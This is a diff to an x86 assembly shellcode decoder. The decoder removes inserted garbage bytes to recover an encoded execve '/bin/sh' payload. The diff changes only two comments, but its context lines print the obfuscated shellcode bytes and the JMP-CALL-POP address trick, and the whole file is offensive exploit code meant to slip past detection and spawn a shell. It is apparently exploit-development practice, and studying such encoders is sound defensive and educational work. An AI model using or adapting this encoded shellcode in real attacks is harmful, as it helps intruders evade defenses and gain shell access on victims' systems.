@@ -23,7 +23,7 @@
 ;   * decoder has 33 bytes (the final amount depends on the shellcode length plus garbage bytes)
 ;   * null-free
 ;   * decodes any pattern of garbage insertion
-;       Eg.: True Byte = X, Garbage Byte = _
+;       Eg: True Byte = X, Garbage Byte = _
 ;	     _ X _ X _ ...
 ;	     X _ _ X X ...
 ;	     X X X _ _ ... 
@@ -67,7 +67,7 @@ decoder:
 	jmp short decoder		; continue decoding
 
 getaddress:
-	call mainflow			; call back just to get the eip (address of the execve below)
+	call mainflow			; call back just to get the eip (address of the coded execve below)
 	execve: db 0x3F, 0x3F, 0x3F, 0x31, 0x3F, 0xc9, 0x3F, 0xf7, 0xe1, 0x3F
 		db 0xb0, 0x0b, 0x3F, 0x51, 0x68, 0x3F, 0x2f, 0x2f, 0x3F, 0x73
 		db 0x68, 0x3F, 0x68, 0x2f, 0x3F, 0x62, 0x69, 0x3F, 0x6e, 0x89
